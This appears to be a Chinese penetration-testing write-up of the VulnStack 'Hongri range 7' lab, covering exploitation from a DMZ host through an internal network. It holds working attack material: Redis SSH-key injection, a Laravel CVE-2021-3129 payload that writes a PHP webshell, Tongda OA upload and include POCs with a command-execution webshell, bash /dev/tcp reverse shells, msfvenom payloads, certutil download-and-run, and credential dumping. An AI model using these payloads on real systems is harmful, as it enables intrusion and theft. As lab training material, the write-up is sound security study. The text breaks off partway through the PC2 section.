---
title: 红日靶场七
description: 红日靶场七完整渗透记录：DMZ 打点、三层内网渗透、横向移动、域控接管与持久化
tags: [Lab, 红日靶场, 内网渗透, 域渗透, 横向移动, 持久化]
status: 已完成
finish-date: 2026-10-21
difficulty: 困难
platform: VulnStack
key_points: |
  1. 配置三张网卡与三层层级网络
  2. 外网 Web1 打点并建立代理
  3. 依次突破 Web2、PC1、PC2 与 DC
  4. 使用 CS/MSF 上线并配置 FRP 级联持久化
highlights: |
  - 完整覆盖 DMZ 到域控的多层代理与横向移动
  - 记录乱码、代理、持久化等问题及解决方法
---

# 红日靶场七
## 环境搭建

### 网络拓扑

- DMZ区IP段为192.168.162.1/24
- 第二层网络环境IP段为192.168.52.1/24
- 第三层网络环境IP段为192.168.93.1/24
  
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-03-56.png)

### 网卡设置
配置三张网卡，在Vmware中新增三个虚拟网卡VMnet8、VMnet9、 VMnet10。

- VMnet8设为默认的NAT模式，IP段设为192.168.162.0/24
- VMnet9设为仅主机模式，IP段设为192.168.52.0/24
- VMnet10设为仅主机模式，IP段设为192.168.93.0/24

### 主机配置

1. Web1配置了两个网卡，一个连接在VMnet8上可以对外提供服务；一个连接在VMnet9上连通第二层网络。
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-02.png)
   IP分别为192.168. 162.129和192.168.52.10
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-21.png)

2. Windows 7 (PC 1)配置了两个网卡，一个连接在VMnet9上连通第二层网，一个连接在VMnet10上连通第三层网络。 
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-42.png)
   ip地址为192.168.52.30和192.168.93.20 
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-36-57.png)

3. Web2和pc1一样配置了两个网卡，一个连接在VMnet9上连通第二层网络，一个连接在VMnet10上连通第三层网络。 
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-37-29.png)
   ip地址分别为192.168.52.20和192.168.93.10 

4. Windows 7 (PC 2)只配置了一个网卡，连接在VMnet10上连通第三层网络
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-37-48.png)
   ip为192.168.93.40
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-38-06.png)

5. Windows Server 2012和PC 2只配置了一个网卡，一个连接在VMnet9上连通第三层网络。
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-38-49.png)
   ip 192.168.93.30 
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-39-06.png)

6. kali配置VMnet8（nat）网卡
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-39-43.png)
   ip为192.168.162.128
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-40-02.png)

### 服务配置

1. DMZ区的 Ubuntu 需要启动nginx服务：
   ```
   redis-server /etc/redis.conf    #启动Redis
   /usr/sbin/nginx -c /etc/nginx/nginx.conf	#启动nginx
   iptables -F		#清空防火墙规则
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-40-49.png)
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-41-13.png)
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-41-20.png)

2. 第二层网络的 Ubuntu需要启动docker容器：
   ```
   sudo service docker start
   sudo docker start 8e172820ac7
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-03.png)

3. 第三层网络的 Windows 7 （PC 1）需要启动通达OA：
   ```
    C:\MYOA\bin\AutoConfig.exe
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-32.png)
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-39.png)
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-42-44.png)

## 外网kali——>DMZ区Web1
>通过web1的Redis未授权访问向web1中/root/.ssh目录写入kali的ssh公钥，从而直接通过ssh连接获得web1的root权限

### 外网主机探测
**Kali中对192.168.162.0/24网段进行主机和端口探测**
```
Nmap -sn 192.168.162.0/24      # 探测存活主机
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-51-51.png)
探测到192.168.162.129这台主机存活

**探测该主机开放的服务端口**

```
Namp -sV -sC -p- 192.168.162.129  #探测开放端口
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-52-13.png)
开放了22,80,81,6379端口

*利用点：6379 端口 (Redis)：Redis 2.8.17。这是一个非常老的版本，极大概率存在未授权访问漏洞。*

### 漏洞利用+权限维持
>利用Redis 未授权访问漏洞拿 Web1 的 Root 权限

**生成ssh秘钥对**
```
ssh-keygen -t rsa -f /root/.ssh/id_rsa_red7      # 生成 SSH 密钥对（一路回车，不用设置密码）
(echo -e "\n\n"; cat /root/.ssh/id_rsa_red7.pub; echo -e "\n\n") > /tmp/pubkey.txt			# 把公钥前后加上换行符，避免和 Redis 的二进制头混淆cat /tmp/pubkey.txt | redis-cli -h 192.168.162.129 -x set crackit			# 将公钥内容写入 Redis 的 key (命名为 crackit)
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-53-07.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-53-14.png)

**利用Redis未授权访问漏洞向目标主机写入ssh认证公钥**
```
redis-cli -h 192.168.162.129		#  登录 Redis 交互界面
```
向目标服务器的 /root/.ssh/ 目录中写入的 SSH 公钥，从而直接获取服务器的 root 权限。
```
config set dir /root/.ssh/
config set dbfilename authorized_keys
save
Exit
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-55-01.png)

**使用刚刚生成的密钥对私钥认证，通过ssh连接目标服务器获取shell**

```
ssh -i /root/.ssh/id_rsa_red7 root@192.168.162.129
```
成功获取web1的root权限
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-01-55-10.png)


### CS监听Web1（直连）

- **在cs中创建http监听器**
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-20-23-15.png)
-  
## kali——>二层web2、PC1
>利用web1作为跳板机，设置代理转发，使kali能够访问到二层内网中的web2和pc1
>利用永恒之蓝（MS17-010）获取pc1的shell或者利用8080端口开放的http服务（通达OA系统）中的web漏洞获取shell
>利用Laravel框架漏洞（CVE-2021-3129）获取web2的shell

### 设置代理转发

**在 Kali 和 Web1 之间建立 SOCKS5 代理**
   ```
   ssh -D 9050 -f -N -i ~/.ssh/id_rsa_red7 root@192.168.162.129
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-00-26.png)
   验证代理是否生效：
   ```
   proxychains4 curl http://192.168.52.30:8080
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-00-29.png)

**开启kali中浏览器代理**
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-05-09.png)

   验证代理是否生效：
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-10-19.png)
   成功在kali中访问到pc1
### web2
#### 漏洞探测
nmap扫描开放端口
```
nmap -sS -Pn -p- --min-rate 1000 192.168.52.20
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-52-18.png)
开放了22端口和8000端口

访问8000端口看一下
```
proxychains4 curl http://192.168.52.20:8000
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-56-23.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-57-09.png)
发现使用的是laravel框架，而且是小于8.4.2的版本可能存在漏洞
#### 漏洞利用
>Laravel Debug mode RCE（CVE-2021-3129）拿下web2的shell
##### msf
msf查找对应的漏洞利用模块
```
search CVE-2021-3129
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-14-55.png)

尝试利用该漏洞
```
use exploit/multi/php/ignition_laravel_debug_rce
set RHOSTS 192.168.52.20
set LHOST 192.168.162.128
set Proxies socks5:127.0.0.1:9050
set ReverseAllowProxy true
set RPORT 8000
set ForceExploit true
run
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-18-50.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-47-28.png)
msf显示不存在可利用的漏洞，但有可能是误报，换个利用工具

##### SecPros-Team/laravel-CVE-2021-3129-EXP

**该脚本需要配合 phpggc 工具使用，并且必须把脚本放到 phpggc 的同一个目录下运行，否则可能无法正常生成 payload**
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-49-55.png)

```
proxychains python3 laravel-CVE-2021-3129-EXP.py http://192.168.52.20:8000
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-02-50-51.png)
利用成功，webshell地址:http://192.168.52.20:8000/fuckyou.php,密码:pass

**使用哥斯拉连接**

```
proxychains4 java -jar godzilla.jar  #让哥斯拉的流量走代理
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-41-46.png)
连接不成功，换了好几个版本都不行，修改laravel-CVE-2021-3129-EXP脚本

>核心思路是：利用 phpggc 生成一条恶意的序列化 POC，让目标服务器在触发漏洞时，顺便执行一段系统命令，这段命令负责下载并写入一个最新版（4.0）的哥斯拉木马。

- 第一步：准备 4.0.1 版本的木马
   把最新版哥斯拉（4.0.1）生成的一句话木马（其实就是一段加密的 PHP 代码）转换成Base64 编码。
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-52-16.png)
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-52-52.png)

- 第二步：利用 phpggc 生成反序列化 POC

   ```bash
   php -d "phar.readonly=0" ./phpggc Laravel/RCE5 "system('echo PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg== | base64 -d > /var/www/html/shell.php');" --phar phar -o php://output | base64 -w 0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:] + '=00' for i in sys.stdin.read()]).upper())"
   ```
   *PD9waHAKZXZhbCgkX1BPU1RbInBhc3MiXSk7Cg==*就是哥斯拉木马的base64编码格式
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-09-55.png)

   **核心逻辑**

   - 它生成了一个 Laravel/RCE5 的反序列化链。这个链条里塞入了一段系统命令：system('echo [木马base64] | base64 -d > /var/www/html/shell.php');。
   - 一旦 Laravel 漏洞被触发，目标系统就会执行这段系统命令，把 Base64 还原成 4.0.1 版的哥斯拉木马，并保存到 /var/www/html/shell.php。后面的 python 代码则是把这个 POC 格式化成漏洞需要的特殊字符格式（=00）。

- 第三步：修改 EXP 脚本

   打开原来的漏洞利用 Python 脚本，找到专门负责写入木马/发送 POC 的地方，把脚本原本自带的 2.x 版木马 POC，替换成了刚才用 phpggc 生成的、可以写入 4.0 版木马的 POC。同时，把脚本里生成的木马文件名改成了 shell.php。

   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-11-00.png)
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-12-20.png)

- 第四步：再次运行魔改后的exp脚本
   按理说此时脚本会在目标网站上上传刚刚的哥斯拉木马，用最新版的哥斯拉（4.0.1）去连 http://192.168.52.20:8000/shell.php，应该会成功

   但是不知道什么原因这次脚本直接显示不存在漏洞，可能是我把脚本改坏了，我后面再研究研究

##### ajisai-babu/CVE-2021-3129-exp
>ajisai-babu 的脚本仓库链接是：https://github.com/ajisai-babu/CVE-2021-3129-exp

```
proxychains4 python3 CVE-2021-3129.py -u http://192.168.52.20:8000 --exp
```
运行改脚本利用laravel反序列化漏洞向目标网站上传webshell

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-25-58.png)

蚁剑连接
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-21-24.png)

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-27-58.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-29-02.png)
成功获得web2的低权限shell

#### 提权
>suid+环境变量提权
>docker逃逸

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-04-57-41.png)
发现.dockerenv文件，说明这是docker容器环境，需要进行docker逃逸，当前shell权限位www-data低权限，需要先进行提权

##### suid+环境变量提权
>先查找有suid权限的可执行文件，尝试进行suid提权
```
find / -perm -4000 -type f 2>/dev/null
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-02-18.png)
发现可疑文件/home/jobs/shell

**对/home/jobs/shell文件进行分析**

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-04-50.png)

64位可执行文件，属主是root，可以用来提权

**进入/home/jobs/目录查看其他相关文件**
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-06-55.png)
demo.c可能是shell程序的源码

**分析demo.c**
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-07-36.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-08-08.png)
直接运行shell程序发现启动了ps进程说明demo.c确实是shell的源码

>提权思路：shell程序拥有suid权限且属主为root，当运行shell程序时会以root权限启动进程，该程序会使用相对路径启动一个子进程ps，子进程继承父进程的权限（root），我们可以利用环境变量劫持将ps指向假的ps文件，从而获得一个以root权限启动的shell

**创建一个假的ps文件**
```
cd /tmp
echo '/bin/bash' >ps
chmod 777 ps
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-05-32-49.png)

**启动反弹shell**

*在kali中的web1 shell中监听4488端口*
```
nc -lnvp 4488
```

*在webshell中进行反向链接*
```
bash -c 'bash -i >& /dev/tcp/192.168.52.10/4488 0>&1'
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-14-03.png)

>上述是在web1上获取的反向连接，另一种姿势是利用web1作为跳板机进行流量转发，最终在kali中建立反向连接

*在kali中监听4488端口*
```
nc -lnvp 4488
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-21-57.png)

*在web1 shell中进行流量转发*
```
socat TCP4-LISTEN:5555,fork TCP4:192.168.162.128:4488
```
- TCP4-LISTEN:5555：让跳板机监听自己的 5555 端口，等待别人连进来。

- fork：允许多个连接同时进来，为每个连接创建一个新进程（保证稳定）。

- TCP4:192.168.162.128:4488：一旦收到数据，就立刻把数据转发到 Kali 机的 4488 端口

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-23-00.png)

*在webshell中进行反向链接*
```
bash -c 'bash -i >& /dev/tcp/192.168.52.10/5555 0>&1'
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-23-43.png)

**劫持环境变量**
```
export PATH=/tmp:$PATH
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-15-26.png)

**运行shell程序获得一个root权限的伪造ps子进程**

```
cd /home/jobs
./shell
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-16-56.png)
成功提权

##### Docker逃逸
>在docker中提权成功后就需要利用docker的配置漏洞逃逸到宿主机中从而获得宿主机的root权限

**查找配置漏洞:特权模式检测**

- 通过cat /proc/self/status | grep CapEff查看能力值，若返回值为 0000003fffffffff 等接近全权限的掩码，则确认容器以特权模式运行
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-33-57.png)

**查看宿主机磁盘分区**

```
fdisk -l
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-34-47.png)

**挂载文件系统**

```
mkdir /temp        # 创建临时目录作为挂载点
mount /dev/sda1 /temp      #将宿主机的物理磁盘挂载到刚刚创建的临时目录
```

**切换文件系统视角**

```
chroot /temp /bin/bash        # 将当前进程及其子进程的根目录切换为 /temp（即宿主机磁盘），并启动 bash
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-42-10.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-44-08.png)
逃逸成功
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-46-06.png)
成功获得web2机器的明文账号密码，进行ssh连接
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-53-26.png)
登录成功
 
#### 权限维持 
>向web2中写入ssh公钥

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-06-58-10.png)

*查看之前在kali中生成的ssh公钥*
```
cat /root/.ssh/id_rsa_pub
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-02-57.png)
```
echo > /home/ubuntu/.ssh/authorized_keys     # 创建空文件
echo "[kali中的ssh公钥]" > /home/ubuntu/.ssh/authorized_keys  # 向该文件中写入ssh公钥
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-04-16.png)

**在kali中里ssh秘钥认证登录web2**

- 方式一：使用 Proxychains（代理链）

   ```
   proxychains4 ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /root/.ssh/id_rsa_red7 ubuntu@192.168.52.20
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-28-09.png)

- 方式二：Web1 的持久化端口转发（最稳定）

   如果在 Web1 上配置了端口转发（比如 socat TCP4-LISTEN:2222,fork TCP4:192.168.52.20:22），那么你直接在 Kali 上连 Web1 的 5555 端口，实际上连的就是 Web2 的 22 端口

   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-33-46.png)
   ```bash
   ssh -p 2222 -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /root/.ssh/id_rsa_red7 ubuntu@192.168.162.129
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-35-11.png)

ssh连接的是ubuntu用户，还不是root权限
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-04-53.png)

**查找漏洞进行提权**

- 查看系统版本
   ```
   uname -a
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-07-19.png)
   ubuntu14.04的系统，版本很老
- 到网上找一下有没有Nday 
  - 发现有多个漏洞，使用CVE-2021-3493提权
  - 漏洞分析文章地址`https://developer.aliyun.com/article/1220938`
  - exp下载地址`https://github.com/briskets/CVE-2021-3493`

**CVE-2021-3493提权**

- 在web2的shell中下载漏洞利用脚本
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-35-37.png)
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-35-21.png) 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-34-53.png) 
- 编译漏洞利用脚本，加执行权限并运行程序
  ```
   gcc -o exploit exploit.c
   chmod +x exp
   ./exp
  ```     
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-35-56.png)

- 提权成功 

### pc1
#### 漏洞探测
**nmap扫描开放端口**
```
nmap -sS -Pn --min-rate 1000 -p- 192.168.52.30
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-53-25.png)

##### 发现445端口开放，可能存在永恒之蓝

使用msf框架探测
在 Kali 终端启动 msfconsole
```
search ms17_010      #查找相关模块

```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-25-54.png)

选择利用的模块路径并配置好参数
```
use auxiliary/scanner/smb/smb_ms17_010    
set RHOSTS 192.168.52.30
run
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-28-23.png)
发现确实存在永恒之蓝漏洞可以利用

##### 8080端口的http服务可能存在漏洞

访问pc1的8080端口，发现是通达OA系统
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-11-45.png)

未授权访问/inc/expired.php
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-10-35-22.png)
Web服务版本号：11.3.200106

上网搜索运行该版本的系统的历史漏洞有哪些
```
https://www.cnblogs.com/KHZ521/p/14018078.html
```
```
https://www.cnblogs.com/BOHB-yunying/p/12833848.html
```
发现该版本系统存在任意用户登录漏洞和远程命令执行漏洞

#### 漏洞利用
##### MS17-010永恒之蓝拿下PC1的shell
>很奇怪，我打pc1的时候用的是ssh动态转发+web1跳板访问到52段的然后msf可以对pc1进行永恒之蓝的利用然后成功拿下
>但是后来做持久化的时候用msf本身的路由就无法对pc1进行永恒之蓝漏洞利用了
在 Kali 终端启动 msfconsole
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.52.30
set Proxies socks5:127.0.0.1:9050
set payload windows/x64/meterpreter/bind_tcp	# 内网机器回连不到 Kali，必须用 bind_tcp
set LPORT 4444
run
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-03-35.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-18-21-04-51.png)
已经是system权限不需要提权了

##### 通达OA未授权任意文件上传漏洞拿下PC1的shell
参考文章`https://blog.csdn.net/szgyunyun/article/details/107104288`

- **任意用户登录**

  - 登录处抓包
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-13-27-05.png)
  - 修改再发包
    ```
    /logincheck.php ——> /logincheck_code.php
    删除cookie
    在post包中添加UID=1
    ```
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-13-33-02.png)
  - 获取服务端返回的SESSID
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-13-35-09.png)

  - 用获取的SESSID访问/general/index.php?isIE=0 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-17-46-18.png) 
    登录成功了不过跳转到`/inc/expired.php?from=3&t1=-2035&t2= `l了
     
- **任意文件上传漏洞利用**

  - 漏洞位置：`/ispirit/im/upload.php`

  - *POC*

     ```
     POST /ispirit/im/upload.php HTTP/1.1
     Host: 192.168.52.30:8080
     Content-Length: 658
     Cache-Control: no-cache
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
     Accept: */*
     Accept-Encoding: gzip, deflate
     Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
     Cookie: PHPSESSID=123
     Connection: close

     ------WebKitFormBoundarypyfBh1YB4pV8McGB
     Content-Disposition: form-data; name="UPLOAD_MODE"

     2
     ------WebKitFormBoundarypyfBh1YB4pV8McGB
     Content-Disposition: form-data; name="P"

     123
     ------WebKitFormBoundarypyfBh1YB4pV8McGB
     Content-Disposition: form-data; name="DEST_UID"

     1
     ------WebKitFormBoundarypyfBh1YB4pV8McGB
     Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
     Content-Type: image/jpeg

     <?php
     $command=$_POST['cmd'];
     $wsh = new COM('WScript.shell');
     $exec = $wsh->exec("cmd /c ".$command);
     $stdout = $exec->StdOut();
     $stroutput = $stdout->ReadAll();
     echo $stroutput;
     ?>
     ------WebKitFormBoundarypyfBh1YB4pV8McGB--
     ```
     ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-57-09.png)

  - *上传的文件路径*
    2610/1244110933.jpg

- **文件包含利用**

  - 漏洞位置：`/ispirit/interface/gateway.php`

  - *POC*
    ```
    POST /ispirit/interface/gateway.php HTTP/1.1
    Host: 192.168.52.30:8080
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.21.0
    Content-Length: 72
    Content-Type: application/x-www-form-urlencoded

    json={"url":"/general/../../attach/im/2610/1244110933.jpg"}&cmd=whoami
    ``` 
     
  - 成功执行系统命令
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-18-59-10.png)

- **使用msf上线pc1**  
  - 使用 msfvenom 在 Kali 上生成一个回连到 Web1（192.168.52.10）的 MSF 木马
    ```
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.10 LPORT=3333 -f exe -o msf_pc1.exe
    ``` 
  - 在 Kali 上启动 MSF 监听：
    ```
    msfconsole -q
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST 192.168.52.10
    set LPORT 3333
    run
    ``` 
  - 将木马程序传到web1上，然后让pc1从web1下载木马
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-42-22.png)
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-42-37.png) 
  - web1开启流量转发
    ```
    socat TCP4-LISTEN:3333,fork TCP4:192.168.162.128:3333
    ``` 
    将pc1连接web1的3333端口的流量转发给kali的3333端口
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-47-06.png)
  - 通过 gateway.php 的文件包含漏洞执行下载木马，执行木马的命令
    - 执行下载
      ```
      certutil -urlcache -split -f http://192.168.52.10:1678/msf_pc1.exe .\msf.exe
      ``` 
      ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-03-52.png)
    
    - 启动木马
      ```
      .\msf.exe
      ```
  - ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-47-51.png)
    成功获得一个会话

  - ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-00-48-28.png)
    拿下pc1且是system权限    


#### 横向移动
>获取的PC1为system权限可以上传mimiktz进行密码抓取为横向移动做准备

**使用msf内置模块kiwi**
  
  ```
  meterpreter > load kiwi
  meterpreter > creds_all
  ```

  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-32-15.png)
  成功获得明文密码
  ```
  Administrator:Whoami2021
  bunny:Bunny2021
  ```
## kali——>三层PC2、DC（内网渗透/横向移动）
### 配置代理隧道
>利用 EarthWorm (EW) 工具搭建多级网络代理隧道（LCX 正向级联）

- kali中开启lcx_listen
   ```
   ./ew_for_linux64 -s lcx_listen -l 12345 -e 8899
   ``` 
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-05-25.png)

- web1开启lcx_slave
  - 在web1中下载ew_for_linux64
    - kali在目录下开启http服务
      ```
      python -m http.server 6789
      ``` 
      ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-18-34.png)
    - web1中访问kali开启的http服务获取ew_for_linux64
      ```
      wget http://192.168.162.128:6789/ew_for_linux64
      ```
      ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-18-17.png)
  - 开启lcx_slave
   ```
   ./ew_for_linux64 -s lcx_slave -d 192.168.162.128 -e 8899 -f 192.168.52.30 -g 4445
   ``` 
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-19-08.png)
- pc1中开启ssocksd 
  - 上传ew_for_Win.exe到pc1
    
    ```
    upload /home/ep/桌面/temp/ew_for_Win.exe C:\\Windows\\Temp\\ew_for_Win.exe
    ```  
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-10-18.png) 
  - 开启ssocksd
    ```
    ew_for_win.exe -s ssocksd -l 4445 
    ```

- ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-21-16.png)

- kali中配置代理
  - 在/etc/proxychains4.conf 文件末尾添加socks5 0.0.0.0 12349
  - 意思是告诉 Proxychains：以后所有的代理流量，都交给本地的 12349 端口
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-23-45.png) 

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-24-22.png)
成功打通链路

### 内网信息收集
**网段探测**
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-08-00-08.png)
存在192.168.93.0/24网段

**存活主机探测**
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-59-11.png)
存在PC2和DC两台内网主机

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-08-01-46.png)
DC的IP为192.168.93.30
PC2的IP为192.168.93.40

**net user /domain**查看域用户
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-11-39-34.png)

### PC2
#### 漏洞探测
**端口扫描**
```
nmap -sS -Pn --min-rate 1000 -p- 192.168.93.40
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-48-31.png)

445端口开放，可能存在永恒之蓝
使用msf框架探测
